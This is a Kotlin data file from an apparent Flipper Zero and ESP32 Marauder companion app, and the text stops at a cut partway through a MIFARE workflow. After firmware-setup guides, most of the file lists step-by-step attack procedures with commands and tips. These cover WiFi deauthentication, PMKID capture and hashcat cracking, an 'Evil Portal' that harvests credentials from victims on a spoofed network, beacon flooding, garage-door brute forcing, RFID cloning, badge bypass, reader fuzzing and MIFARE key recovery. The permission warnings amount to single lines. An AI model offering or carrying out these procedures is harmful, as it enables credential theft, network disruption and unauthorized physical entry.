package com.twoskoops707.newpen.data

import com.twoskoops707.newpen.data.models.Category
import com.twoskoops707.newpen.data.models.Command
import com.twoskoops707.newpen.data.models.Device
import com.twoskoops707.newpen.data.models.Hardware
import com.twoskoops707.newpen.data.models.Workflow
import com.twoskoops707.newpen.data.models.WorkflowStep

object WorkflowRepository {

    private val allWorkflows: List<Workflow> = listOf(

        Workflow(
            id = "setup_momentum",
            title = "Install Momentum Firmware",
            subtitle = "Update Flipper Zero to Momentum custom firmware",
            categoryId = "setup",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "PC or Android phone", "USB-C cable or Bluetooth"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Download qFlipper App",
                    description = "Install the official qFlipper app on your PC or use the Flipper mobile app on Android. qFlipper handles firmware updates wirelessly.",
                    tips = listOf(
                        "Available for Windows, macOS, Linux",
                        "Android mobile app can also update firmware via Bluetooth"
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Connect Flipper Zero",
                    description = "Connect Flipper to PC via USB-C cable, or ensure Bluetooth is enabled on Flipper (Settings > Bluetooth > ON) for wireless update.",
                    tips = listOf(
                        "USB is faster and more reliable",
                        "BT update takes ~10 minutes"
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Open qFlipper & Select Device",
                    description = "Open qFlipper. It auto-detects your Flipper. Click on the device name."
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Install Momentum Firmware",
                    description = "In qFlipper click 'Update' and the latest Momentum firmware will be downloaded and installed automatically. Do NOT disconnect during update.",
                    warning = "Never unplug during firmware flash — will brick device",
                    tips = listOf(
                        "Momentum firmware: https://momentum-fw.dev/",
                        "Alternative: download .tgz from GitHub and drag into qFlipper"
                    )
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Verify Installation",
                    description = "After reboot Flipper shows 'Momentum' on boot screen. Navigate Main Menu > Settings > Firmware to confirm version.",
                    tips = listOf(
                        "Momentum adds: BLE Spam app, GPS SubDriving, rolling code support, 8 menu styles, control center"
                    )
                )
            )
        ),

        Workflow(
            id = "setup_marauder",
            title = "Flash AWOK with Marauder",
            subtitle = "Install ESP32 Marauder firmware on AWOK Dual Mini v3",
            categoryId = "setup",
            hardware = listOf(Hardware.AWOK),
            prerequisites = listOf("AWOK Dual Mini v3", "PC with Python 3", "USB-C cable"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Install Python",
                    description = "Install Python 3.x and pip on your PC. Required for the flash tool.",
                    commands = listOf(
                        Command("Windows", "winget install Python.Python.3", Device.PC),
                        Command("Mac/Linux", "brew install python3 OR sudo apt install python3", Device.PC)
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Install esptool",
                    description = "Install esptool.py for flashing ESP32 devices.",
                    commands = listOf(
                        Command("Install esptool", "pip install esptool", Device.PC)
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Download Marauder Firmware",
                    description = "Download the latest Marauder firmware .bin file for AWOK Dual Mini v3 from GitHub releases.",
                    tips = listOf(
                        "URL: github.com/justcallmekoko/ESP32Marauder/releases",
                        "File: ESP32Marauder_AWOK_DualMini.bin (or similar)"
                    )
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Connect AWOK in Flash Mode",
                    description = "Connect AWOK Dual Mini v3 to PC via USB-C. Hold BOOT button while plugging in to enter flash mode.",
                    tips = listOf(
                        "Some units: hold BOOT then press RESET",
                        "Device shows as COM port (Windows) or /dev/ttyUSB0 (Linux)"
                    )
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Flash Marauder Firmware",
                    description = "Run esptool to flash Marauder.",
                    commands = listOf(
                        Command("Flash command", "esptool.py --port COM3 --baud 921600 write_flash 0x0 ESP32Marauder_AWOK_DualMini.bin", Device.PC)
                    ),
                    tips = listOf(
                        "Replace COM3 with your actual port",
                        "Linux: /dev/ttyUSB0 or /dev/ttyACM0"
                    )
                ),
                WorkflowStep(
                    stepNumber = 6,
                    title = "Reboot and Verify",
                    description = "Unplug and replug AWOK. Screen should show Marauder boot screen. Connect at 115200 baud and type 'help' to verify.",
                    commands = listOf(
                        Command("Serial connect", "screen /dev/ttyUSB0 115200", Device.TERMUX)
                    )
                )
            )
        ),

        Workflow(
            id = "setup_marauder_app",
            title = "Install WiFi Marauder Flipper App",
            subtitle = "Add the Marauder companion app to Flipper Zero",
            categoryId = "setup",
            hardware = listOf(Hardware.BOTH),
            prerequisites = listOf("Flipper Zero with custom firmware", "AWOK with Marauder", "GPIO wiring"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Download Marauder .fap File",
                    description = "Download the WiFi Marauder .fap file for Flipper Zero from GitHub.",
                    tips = listOf(
                        "URL: github.com/0xchocolate/flipperzero-wifi-marauder",
                        "Or search 'WiFi Marauder' in Flipper app catalog"
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Copy to Flipper SD Card",
                    description = "Copy the .fap file to /ext/apps/GPIO/ folder on Flipper's SD card via USB.",
                    tips = listOf(
                        "Connect Flipper via USB → appears as mass storage",
                        "Create /ext/apps/GPIO/ if it doesn't exist"
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Launch the App",
                    description = "On Flipper: Apps > GPIO > [ESP32] WiFi Marauder",
                    commands = listOf(
                        Command("Nav path", "Apps > GPIO > [ESP32] WiFi Marauder", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Set Baud Rate",
                    description = "First time launch: select 'Setup'. Set baud rate to 115200. This matches AWOK's default.",
                    tips = listOf(
                        "If commands don't respond, verify baud rate match"
                    )
                )
            )
        ),

        Workflow(
            id = "setup_pair_bt",
            title = "Pair Flipper to Android",
            subtitle = "Connect Flipper Zero to your phone via Bluetooth",
            categoryId = "setup",
            hardware = listOf(Hardware.FLIPPER, Hardware.PHONE),
            prerequisites = listOf("Flipper Zero", "Android phone", "Flipper Mobile App"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Enable Bluetooth on Flipper",
                    description = "On Flipper: Settings > Bluetooth > Bluetooth > ON",
                    commands = listOf(
                        Command("Navigate", "Settings > Bluetooth > Bluetooth > ON", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Install Flipper Mobile App",
                    description = "Install official Flipper Mobile App from Google Play Store or F-Droid.",
                    tips = listOf(
                        "App: 'Flipper Mobile App' by Flipper Devices"
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Pair in App",
                    description = "Open mobile app > tap '+' > select your Flipper from the list > tap 'Connect'",
                    tips = listOf(
                        "Flipper shows pairing code — confirm on both devices"
                    )
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Verify Connection",
                    description = "App shows device connected, battery %, firmware version. You can now update firmware wirelessly and sync saved keys.",
                    tips = listOf(
                        "Use 'Remote Control' in app to navigate Flipper menus from phone"
                    )
                )
            )
        ),

        Workflow(
            id = "wifi_scan",
            title = "Scan WiFi Networks",
            subtitle = "Discover all nearby access points and connected clients",
            categoryId = "wifi",
            hardware = listOf(Hardware.AWOK),
            prerequisites = listOf("AWOK Dual Mini v3 with Marauder", "Flipper with Marauder app OR direct USB serial"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Launch Marauder App",
                    description = "On Flipper: Apps > GPIO > [ESP32] WiFi Marauder",
                    commands = listOf(
                        Command("Navigate", "Apps > GPIO > [ESP32] WiFi Marauder", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Scan Access Points",
                    description = "Run scanap to discover all nearby access points.",
                    commands = listOf(
                        Command("Scan APs", "scanap", Device.MARAUDER)
                    ),
                    tips = listOf(
                        "Shows: SSID, BSSID, Channel, RSSI (signal strength), Security (WPA2/WPA3/Open)"
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "View AP Results",
                    description = "Run listap to see all discovered APs.",
                    commands = listOf(
                        Command("List results", "listap", Device.MARAUDER)
                    )
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Scan Connected Clients",
                    description = "Run scansta to find connected devices on each AP.",
                    commands = listOf(
                        Command("Scan stations", "scansta", Device.MARAUDER)
                    ),
                    tips = listOf(
                        "Takes 30-60 seconds. Shows MAC addresses of connected devices"
                    )
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Stop Scan",
                    description = "Stop all running scans.",
                    commands = listOf(
                        Command("Stop", "stopscan", Device.MARAUDER)
                    )
                )
            )
        ),

        Workflow(
            id = "wifi_deauth",
            title = "Deauthenticate WiFi Clients",
            subtitle = "Disconnect all clients from a target access point",
            categoryId = "wifi",
            hardware = listOf(Hardware.AWOK),
            prerequisites = listOf("AWOK Dual Mini v3 with Marauder", "Target network in range"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Scan for Access Points",
                    description = "First scan to find target network.",
                    commands = listOf(
                        Command("Scan", "scanap", Device.MARAUDER)
                    ),
                    tips = listOf("Wait 10-15 seconds for full scan")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Stop Scan",
                    description = "Stop the AP scan before proceeding.",
                    commands = listOf(
                        Command("Stop", "stopscan", Device.MARAUDER)
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "List Access Points",
                    description = "View discovered APs with their index numbers.",
                    commands = listOf(
                        Command("List", "listap", Device.MARAUDER)
                    )
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Select Target AP",
                    description = "Select AP by index number (shown in listap output).",
                    commands = listOf(
                        Command("Select AP 0", "select -a 0", Device.MARAUDER)
                    ),
                    tips = listOf("Replace 0 with actual index of target network")
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Launch Deauth Attack",
                    description = "Send continuous deauth frames. All clients on selected AP will be disconnected.",
                    commands = listOf(
                        Command("Deauth attack", "attack -t deauth", Device.MARAUDER)
                    ),
                    warning = "Only perform on networks you own or have permission to test",
                    tips = listOf(
                        "Clients auto-reconnect immediately when attack stops",
                        "Use this to force reconnect for handshake capture"
                    )
                ),
                WorkflowStep(
                    stepNumber = 6,
                    title = "Stop Attack",
                    description = "Stop the deauth attack.",
                    commands = listOf(
                        Command("Stop", "stopscan", Device.MARAUDER)
                    )
                )
            )
        ),

        Workflow(
            id = "wifi_pmkid",
            title = "Capture WiFi Password (PMKID)",
            subtitle = "Capture WPA2 handshake and crack the network password",
            categoryId = "wifi",
            hardware = listOf(Hardware.AWOK),
            prerequisites = listOf("AWOK Dual Mini v3 with Marauder", "Hashcat on PC or Termux", "Wordlist"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Scan and Select Target",
                    description = "Scan APs, select your target network by index.",
                    commands = listOf(
                        Command("Scan", "scanap", Device.MARAUDER),
                        Command("Stop", "stopscan", Device.MARAUDER),
                        Command("List", "listap", Device.MARAUDER),
                        Command("Select", "select -a 0", Device.MARAUDER)
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Start PMKID Sniff",
                    description = "Capture PMKID from first handshake frame — no deauth needed. Router sends PMKID proactively.",
                    commands = listOf(
                        Command("Sniff PMKID", "sniffpmkid", Device.MARAUDER)
                    ),
                    tips = listOf(
                        "Wait 30-120 seconds",
                        "More reliable if clients are actively connected",
                        "PCAP auto-saved to SD card"
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Force Reconnect (Optional)",
                    description = "Run deauth briefly to force clients to reconnect and emit fresh PMKID.",
                    commands = listOf(
                        Command("Deauth briefly", "attack -t deauth", Device.MARAUDER)
                    ),
                    tips = listOf("Stop after 5 seconds")
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Stop Capture and Locate PCAP",
                    description = "Stop capture. Connect Flipper via USB and navigate to PCAP file.",
                    commands = listOf(
                        Command("Stop", "stopscan", Device.MARAUDER)
                    ),
                    tips = listOf(
                        "PCAP location: /apps_data/marauder/pcaps/ on Flipper SD",
                        "Copy .pcap file to your Android phone Downloads folder"
                    )
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Verify in Wireshark",
                    description = "Open PCAP in Wireshark on PC. Filter for EAPOL frames to confirm capture.",
                    commands = listOf(
                        Command("Wireshark filter", "eapol", Device.PC)
                    ),
                    tips = listOf(
                        "Look for 'Message (1 of 4)' frames — these contain PMKID",
                        "EAPOL frames confirm valid WPA handshake capture"
                    )
                ),
                WorkflowStep(
                    stepNumber = 6,
                    title = "Convert to Hashcat Format",
                    description = "Use cap2hashcat to convert PCAP to hashcat format.",
                    commands = listOf(
                        Command("Online tool", "https://hashcat.net/cap2hashcat/", Device.PC),
                        Command("Or local", "hcxtools: hcxpcapngtool -o output.hc22000 capture.pcap", Device.PC)
                    )
                ),
                WorkflowStep(
                    stepNumber = 7,
                    title = "Crack the Password",
                    description = "Run hashcat to crack the password.",
                    commands = listOf(
                        Command("Dictionary attack", "hashcat -m 22000 output.hc22000 /path/to/wordlist.txt", Device.PC),
                        Command("In Termux", "hashcat -m 22000 output.hc22000 /sdcard/wordlist.txt", Device.TERMUX),
                        Command("8-digit PIN brute", "hashcat -m 22000 output.hc22000 -a 3 ?d?d?d?d?d?d?d?d", Device.PC),
                        Command("8-char alpha", "hashcat -m 22000 output.hc22000 -a 3 ?l?l?l?l?l?l?l?l", Device.PC)
                    ),
                    tips = listOf(
                        "Popular wordlists: rockyou.txt, SecLists WiFi wordlists",
                        "GPU cracking on PC is 100x faster than CPU",
                        "8-char all-digit: cracks in seconds on GPU"
                    )
                )
            )
        ),

        Workflow(
            id = "wifi_evilportal",
            title = "Evil Portal — Credential Harvest",
            subtitle = "Create a fake AP with captive portal to capture credentials",
            categoryId = "wifi",
            hardware = listOf(Hardware.AWOK),
            prerequisites = listOf("AWOK Dual Mini v3 with Marauder", "Target WiFi network name"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Scan to Find Target SSID",
                    description = "Scan to identify target network name (SSID) for spoofing.",
                    commands = listOf(
                        Command("Scan", "scanap", Device.MARAUDER)
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Start Evil Portal",
                    description = "Launch evil portal attack. Creates fake WiFi AP with captive portal login page.",
                    commands = listOf(
                        Command("Start", "evilportal", Device.MARAUDER)
                    ),
                    tips = listOf("Default SSID: 'Free WiFi' — change this to match real network name")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Set Target SSID via Flipper App",
                    description = "In the WiFi Marauder Flipper app: select 'Evil Portal' > enter the exact SSID of target network",
                    tips = listOf(
                        "Match SSID exactly including capitalization and spaces",
                        "Victims see 'known network' and auto-connect",
                        "Deauth target network simultaneously to push clients to your portal"
                    )
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Wait for Credentials",
                    description = "When victims connect, browser redirects to fake login page. Any entered credentials are saved.",
                    tips = listOf(
                        "Creds saved to /apps_data/marauder/ on Flipper SD",
                        "Page mimics router admin or ISP login"
                    )
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Retrieve Captured Credentials",
                    description = "Connect Flipper via USB and read credential log from SD card.",
                    commands = listOf(
                        Command("PCAP path", "/apps_data/marauder/", Device.FLIPPER_CLI)
                    )
                )
            )
        ),

        Workflow(
            id = "wifi_beacon_spam",
            title = "Beacon Spam — Flood SSIDs",
            subtitle = "Flood nearby devices with hundreds of fake WiFi network names",
            categoryId = "wifi",
            hardware = listOf(Hardware.AWOK),
            prerequisites = listOf("AWOK Dual Mini v3 with Marauder"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Launch Marauder",
                    description = "Open the ESP32 WiFi Marauder app on Flipper.",
                    commands = listOf(
                        Command("Launch", "Apps > GPIO > [ESP32] WiFi Marauder", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Start Beacon Spam",
                    description = "Floods area with hundreds of fake SSID beacons. Fills WiFi networks list on all nearby devices.",
                    commands = listOf(
                        Command("Beacon spam", "attack -t beacon", Device.MARAUDER)
                    ),
                    tips = listOf(
                        "Creates ~100+ fake SSIDs with random names",
                        "Can cause WiFi scanning to slow or crash on some devices",
                        "Use custom SSID list for targeted spam"
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Stop Attack",
                    description = "Stop the beacon spam attack.",
                    commands = listOf(
                        Command("Stop", "stopscan", Device.MARAUDER)
                    )
                )
            )
        ),

        Workflow(
            id = "subghz_read_replay",
            title = "Read & Replay Fixed-Code Remote",
            subtitle = "Capture and replay RF signals from remotes and keyfobs",
            categoryId = "subghz",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "Target remote or keyfob"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Open Sub-GHz",
                    description = "On Flipper: Main Menu > Sub-GHz",
                    commands = listOf(
                        Command("Navigate", "Main Menu > Sub-GHz", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Read Signal",
                    description = "Select 'Read'. Hold Flipper near remote and press button on remote. Flipper auto-detects frequency and protocol.",
                    commands = listOf(
                        Command("Read", "Sub-GHz > Read", Device.FLIPPER_CLI)
                    ),
                    tips = listOf(
                        "Flipper shows: frequency, protocol, key value",
                        "Common: 433.92 MHz AM650, 315 MHz AM650",
                        "Works for: garage gates, doorbells, RF outlets, car alarms (older)"
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Save Signal",
                    description = "Press OK to save. Name the signal.",
                    tips = listOf("Good name: 'Garage_Door_Main' or 'Gate_Front'")
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Replay Signal",
                    description = "Sub-GHz > Saved > select saved signal > Send",
                    commands = listOf(
                        Command("Send", "Sub-GHz > Saved > [name] > Send", Device.FLIPPER_CLI)
                    ),
                    tips = listOf(
                        "Point Flipper at receiver, press Send",
                        "Hold Send for continuous transmission"
                    )
                )
            )
        ),

        Workflow(
            id = "subghz_brute_garage",
            title = "Brute Force Fixed-Code Garage Door",
            subtitle = "Cycle through all possible codes to open older garage doors",
            categoryId = "subghz",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero with community apps", "Sub-GHz Bruteforcer app installed", "Fixed-code garage door system"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Identify Door System",
                    description = "Read the remote label to identify brand and system age. Fixed-code systems: Came, Nice, BFT, Tedsen, Chamberlain/LiftMaster pre-2011, Genie pre-2005.",
                    tips = listOf(
                        "Post-2011 Chamberlain/LiftMaster: rolling code, cannot brute force",
                        "Look for 'Security+' or 'Security+ 2.0' = rolling code"
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Open Bruteforcer App",
                    description = "Flipper: Apps > Sub-GHz > Sub-GHz Bruteforcer (community app)",
                    tips = listOf(
                        "If not installed: download .fap from github.com/derskythe/flipperzero-firmware-derskythe",
                        "Or find in community app catalog"
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Select Protocol",
                    description = "Choose protocol matching your door brand.",
                    tips = listOf(
                        "CAME 12bit — CAME, BFT brands",
                        "Nice Flo — Nice, Hörmann brands",
                        "Chamberlain — pre-2011 LiftMaster",
                        "Linear — common US brands"
                    )
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Select Frequency",
                    description = "Choose correct frequency:",
                    tips = listOf(
                        "315 MHz — North America (most garage doors)",
                        "433.92 MHz — Europe",
                        "868 MHz — some European systems"
                    )
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Generate De Bruijn Sequence",
                    description = "Select '1 file (De Bruijn)' — generates optimized sequence that covers all codes in minimum transmissions.",
                    tips = listOf(
                        "De Bruijn: 12-bit = tries 4096 codes in ~4096 transmissions",
                        "Much faster than sending each code separately"
                    )
                ),
                WorkflowStep(
                    stepNumber = 6,
                    title = "Transmit and Wait",
                    description = "Press 'Send'. Walk/stand near the door receiver. Transmission cycles through all codes automatically.",
                    warning = "Only perform on your own property",
                    tips = listOf(
                        "12-bit: ~2-5 minutes",
                        "Stay within 10m of receiver for best range",
                        "Some doors need 2+ passes"
                    )
                )
            )
        ),

        Workflow(
            id = "subghz_raw",
            title = "RAW Sub-GHz Capture & Analysis",
            subtitle = "Capture raw RF signals for unknown protocols and rolling codes",
            categoryId = "subghz",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "Universal Radio Hacker on PC (optional)"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Enter RAW Read Mode",
                    description = "Sub-GHz > Read RAW — captures raw signal without protocol decoding.",
                    commands = listOf(
                        Command("RAW Read", "Sub-GHz > Read RAW", Device.FLIPPER_CLI)
                    ),
                    tips = listOf(
                        "Use for unknown protocols",
                        "Also captures rolling codes for offline analysis"
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Set or Detect Frequency",
                    description = "If you know the frequency, set it manually. Otherwise use 'Frequency Analyzer' first.",
                    commands = listOf(
                        Command("Frequency Analyzer", "Sub-GHz > Frequency Analyzer", Device.FLIPPER_CLI)
                    ),
                    tips = listOf("Point Flipper near transmitter, press buttons — analyzer shows active frequency")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Capture Signal",
                    description = "Press OK to start capture. Trigger your remote. Press OK to stop.",
                    tips = listOf("Captures full signal waveform as .sub file")
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Analyze on PC with URH",
                    description = "Copy .sub file to PC. Open in Universal Radio Hacker (URH).",
                    commands = listOf(
                        Command("Analyze", "URH: github.com/jopohl/urh", Device.PC)
                    ),
                    tips = listOf(
                        "URH decodes modulation, protocol, bit values",
                        "Can convert RAW to proper protocol format"
                    )
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Replay RAW Signal",
                    description = "Sub-GHz > Saved > select RAW file > Send. Replays raw waveform.",
                    tips = listOf(
                        "RAW replay works even if protocol is unknown",
                        "Rolling codes: RAW replay may work once if code not yet used"
                    )
                )
            )
        ),

        Workflow(
            id = "rfid_read",
            title = "Read 125kHz RFID Card/Fob",
            subtitle = "Read EM4100, HID Prox, and other 125kHz RFID credentials",
            categoryId = "rfid",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "Target RFID card or keyfob"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Open 125kHz RFID",
                    description = "Navigate to the RFID module on Flipper.",
                    commands = listOf(
                        Command("Navigate", "Main Menu > 125 kHz RFID", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Read Card or Fob",
                    description = "Select 'Read'. Hold card/fob flat against Flipper's back (center). Hold steady.",
                    commands = listOf(
                        Command("Read", "125 kHz RFID > Read", Device.FLIPPER_CLI)
                    ),
                    tips = listOf(
                        "Card must be within 5cm of antenna",
                        "EM4100/EM410x: reads in <1 second",
                        "HID Prox: hold directly against card, may take 2-3 seconds",
                        "Move slightly if no read after 5 seconds"
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "View Card Data",
                    description = "Flipper shows: Card type, Facility Code, Card Number, Full UID",
                    tips = listOf(
                        "EM4100: shows 5-byte (40-bit) unique ID",
                        "HID Prox: shows Facility Code (FC) and Card Number (CN) — same fields used in access control system"
                    )
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Save Card",
                    description = "Press OK to save. Name descriptively.",
                    tips = listOf("Name: 'Office_Badge_Main' or 'Front_Door_Fob'")
                )
            )
        ),

        Workflow(
            id = "rfid_emulate",
            title = "Emulate RFID Card (Badge Bypass)",
            subtitle = "Use Flipper to impersonate a cloned 125kHz access card",
            categoryId = "rfid",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "Saved RFID card in Flipper"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Read Card",
                    description = "Read target card first (or use manually entered UID).",
                    commands = listOf(
                        Command("Read", "125 kHz RFID > Read", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Emulate the Card",
                    description = "125 kHz RFID > Saved > select saved card > Emulate. Flipper now acts as that card.",
                    commands = listOf(
                        Command("Emulate", "125 kHz RFID > Saved > [name] > Emulate", Device.FLIPPER_CLI)
                    ),
                    tips = listOf(
                        "Hold Flipper to reader exactly as you would hold the card",
                        "Keep still — movement during read can fail"
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Test at Reader",
                    description = "Hold Flipper to card reader. Light should change to green / door should unlock.",
                    tips = listOf(
                        "If fails: try different orientation (flip Flipper over)",
                        "Some HID readers: hold Flipper very close, almost touching"
                    )
                )
            )
        ),

        Workflow(
            id = "rfid_clone",
            title = "Clone RFID Card to T5577 Blank",
            subtitle = "Write a cloned credential to a writable T5577 blank card",
            categoryId = "rfid",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "T5577 blank keyfob or card"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Read Original Card",
                    description = "Read and save the original card you want to clone.",
                    commands = listOf(
                        Command("Read", "125 kHz RFID > Read", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Save Card Data",
                    description = "Save the read card data with a descriptive name."
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Get T5577 Blank Cards",
                    description = "Purchase T5577 blank keyfobs or cards. These are universal blank 125kHz cards that can be written with any protocol.",
                    tips = listOf(
                        "Available on Amazon/eBay: 'T5577 RFID blank card'",
                        "Also called 'EM4305' — same thing",
                        "Get keyfob format to attach to keyring"
                    )
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Write to T5577",
                    description = "125 kHz RFID > Saved > select card > Write. Hold T5577 blank card against Flipper back.",
                    commands = listOf(
                        Command("Write", "125 kHz RFID > Saved > [name] > Write", Device.FLIPPER_CLI)
                    ),
                    tips = listOf(
                        "Hold T5577 still for 3-5 seconds during write",
                        "Flipper vibrates on success",
                        "Test clone at reader immediately after"
                    )
                )
            )
        ),

        Workflow(
            id = "rfid_fuzz",
            title = "RFID Brute Force Access",
            subtitle = "Cycle through all RFID codes to find an accepted credential",
            categoryId = "rfid",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "Physical access to card reader"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Open RFID Fuzz",
                    description = "125 kHz RFID > Fuzz — cycles through EM4100 cards sequentially",
                    commands = listOf(
                        Command("Fuzz", "125 kHz RFID > Fuzz", Device.FLIPPER_CLI)
                    ),
                    tips = listOf(
                        "Sends all facility code + card number combinations",
                        "May trigger alarms on monitored systems — know your target"
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Select Protocol",
                    description = "Choose EM4100 or HID. EM4100 most common.",
                    tips = listOf(
                        "EM4100: most older systems",
                        "HID 26bit: most common US commercial buildings"
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Position and Run",
                    description = "Hold Flipper at reader distance and let it cycle. Door opens when matching code is sent."
                )
            )
        ),

        Workflow(
            id = "nfc_read_mifare",
            title = "Read & Clone MIFARE Classic Card",
            subtitle = "Dump and clone an encrypted MIFARE Classic 1K/4K access card",
            categoryId = "nfc",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "Target MIFARE Classic card", "Magic Gen1a card for clone (optional)"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Open NFC",
                    description = "Navigate to the NFC module on Flipper.",
                    commands = listOf(
                        Command("Navigate", "Main Menu > NFC", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Read Card",
                    description = "NFC > Read. Hold card flat against Flipper back (top area). Flipper auto-detects type.",
                    commands = listOf(
                        Command("Read", "NFC > Read", Device.FLIPPER_CLI)
                    ),
                    tips = listOf(
                        "MIFARE Classic 1K/4K most common",
                        "Flipper tries 1241 built-in dictionary keys automatically",
                        "Progress bar shows sector-by-sector decryption"
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Handle Partial Read",
                    description = "If some sectors show '?????' — need to extract those keys using mfkey32.",
                    tips = listOf(
                        "This is normal for cards with non-default keys",
                        "Need to use 'Detect Reader' trick"
                    )
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Detect Reader Attack",
                    description = "NFC > Detect Reader. Hold Flipper near the actual card reader used by target system. Reader sends authentication attempts — Flipper captures these nonces.",
                    commands = listOf(
                        Command("Detect Reader", "NFC > Detect Reader", Device.FLIPPER_CLI)
                    ),
                    tips = listOf(
                        "Hold Flipper where card normally goes on reader",
                        "Wait for reader to attempt auth (may beep)",
                        "Flipper saves captured nonces to file"
                    )
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Extract Keys with mfkey32",
                    description = "Open Flipper mobile app > Tools > mfkey32. This brute-forces the sector keys from the captured nonces.",
                    tips = listOf(
                        "Takes 30-120 seconds on phone",
                        "Recovered keys added to Flipper dictionary automatically"
                    )
                ),
                WorkflowStep(
                    stepNumber = 6,
                    title = "Add Keys to Dictionary",
                    description = "Add recovered keys to extended dictionary for future reads.",
                    commands = listOf(
                        Command("Dict path", "/ext/nfc/assets/mf_classic_dict_user.txt", Device.FLIPPER_CLI)
                    ),
                    tips = listOf(
                        "Also add community dict: Proxmark3 MIFARE dict has thousands of known keys"
                    )
                ),
                WorkflowStep(
                    stepNumber = 7,
